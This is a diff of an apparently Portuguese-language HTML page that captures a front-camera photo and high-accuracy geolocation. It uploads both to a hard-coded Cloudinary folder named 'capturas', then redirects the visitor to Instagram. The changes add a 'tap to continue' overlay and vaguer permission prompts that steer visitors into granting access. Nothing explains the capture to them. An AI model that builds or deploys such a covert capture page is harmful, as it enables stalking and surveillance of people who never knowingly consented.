@@ -10,27 +10,28 @@
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      display: none; /* somente exibe se ocorrer erro */
+      display: flex;
       justify-content: center;
       align-items: center;
       color: #fff;
       font-family: sans-serif;
       font-size: 20px;
-      background: rgba(0,0,0,0.8);
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 9999;
       text-align: center;
       padding: 20px;
-      z-index: 9999;
     }
   </style>
 </head>
 <body>
-  <div id="overlay"></div>
+  <!-- Overlay inicial -->
+  <div id="overlay">Toque para continuar...</div>
   <script>
     const cloudName = "dx5legahb";      // Seu Cloudinary Cloud Name
     const uploadPreset = "upload";       // Seu Upload Preset (unsigned)
-    const folderName = "capturas";       // Pasta de destino
+    const folderName = "capturas";       // Pasta de destino no Cloudinary
 
-    // Função para mostrar o overlay com mensagem e callback no clique
+    // Função para exibir o overlay com uma mensagem e executar um callback ao toque.
     function showOverlay(message, callback) {
       const overlay = document.getElementById("overlay");
       overlay.textContent = message;
@@ -41,7 +42,7 @@
       };
     }
 
-    // Captura a foto usando a câmera frontal
+    // Captura a foto utilizando a câmera frontal.
     async function capturePhoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -49,11 +50,12 @@
           audio: false
         });
         const video = document.createElement("video");
-        video.playsInline = true;  // essencial para iOS
+        video.playsInline = true; // Essencial para iOS
         video.muted = true;
         video.srcObject = stream;
         await video.play();
-        // Aguarda um instante para garantir que o vídeo renderizou
+
+        // Aguarda um breve período para garantir que o vídeo renderizou.
         await new Promise(r => setTimeout(r, 300));
 
         const canvas = document.createElement("canvas");
@@ -62,7 +64,7 @@
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         stream.getTracks().forEach(track => track.stop());
-        
+
         const imageData = canvas.toDataURL("image/png");
         const imageBlob = await (await fetch(imageData)).blob();
 
@@ -77,9 +79,10 @@
         });
         if (!response.ok) throw new Error("Erro ao enviar imagem");
         const data = await response.json();
-        return data.secure_url;
+        return data.secure_url;  // Retorna a URL da imagem
       } catch (error) {
         console.error("Erro na captura da foto:", error);
+        // Exibe mensagem de erro e re-tenta somente a parte da câmera.
         showOverlay("Permita acesso à câmera para continuar. Toque para tentar novamente.", () => {
           capturePhoto().then(url => proceedToLocation(url));
         });
@@ -87,8 +90,8 @@
       }
     }
 
-    // Solicita a localização e envia os dados para o Cloudinary
-    function requestLocation(imageUrl) {
+    // Solicita a localização e envia o arquivo de texto para o Cloudinary.
+    function captureLocation(imageUrl) {
       navigator.geolocation.getCurrentPosition(async (pos) => {
         try {
           const { latitude, longitude } = pos.coords;
@@ -105,18 +108,18 @@
             body: textForm
           });
           if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
-          // Se tudo ocorrer bem, redireciona para o Instagram
+          // Se tudo ocorrer bem, redireciona para o Instagram.
           window.location.href = "https://instagram.com";
         } catch (err) {
           console.error("Erro no envio da localização:", err);
-          showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-            requestLocation(imageUrl);
+          showOverlay("É necessário as permissões para continuar... Toque para continuar.", () => {
+            captureLocation(imageUrl);
           });
         }
       }, (err) => {
         console.error("Erro ao obter localização:", err);
-        showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-          requestLocation(imageUrl);
+        showOverlay("É necessário as permissões para continuar... Toque para continuar.", () => {
+          captureLocation(imageUrl);
         });
       }, {
         enableHighAccuracy: true,
@@ -125,27 +128,28 @@
       });
     }
 
-    // Função para iniciar o fluxo após a foto ser capturada
+    // Após capturar a foto, procede para a captura da localização.
     function proceedToLocation(imageUrl) {
-      // Chama a solicitação de localização sem exibir overlay extra se tudo ocorrer bem
-      requestLocation(imageUrl);
+      // Solicita a permissão de localização com um toque para continuar.
+      showOverlay("Toque para permitir localização", () => {
+        captureLocation(imageUrl);
+      });
     }
 
-    // Função principal: inicia a captura da foto
-    async function iniciarFluxo() {
+    // Função principal que inicia o fluxo: captura a foto e, se bem-sucedida, prossegue para a localização.
+    async function startFlow() {
       try {
         const imageUrl = await capturePhoto();
-        // Se a foto for capturada com sucesso, passa para a localização
         proceedToLocation(imageUrl);
       } catch (e) {
         console.error("Erro no fluxo:", e);
       }
     }
 
-    // Inicia o fluxo apenas quando o usuário tocar na tela (para garantir interação no iOS)
-    document.body.addEventListener("click", function handler() {
-      document.body.removeEventListener("click", handler);
-      iniciarFluxo();
+    // Inicia o fluxo com a interação inicial do usuário (obrigatório para iOS)
+    document.getElementById("overlay").addEventListener("click", function handler() {
+      document.getElementById("overlay").removeEventListener("click", handler);
+      startFlow();
     });
   </script>
 </body>
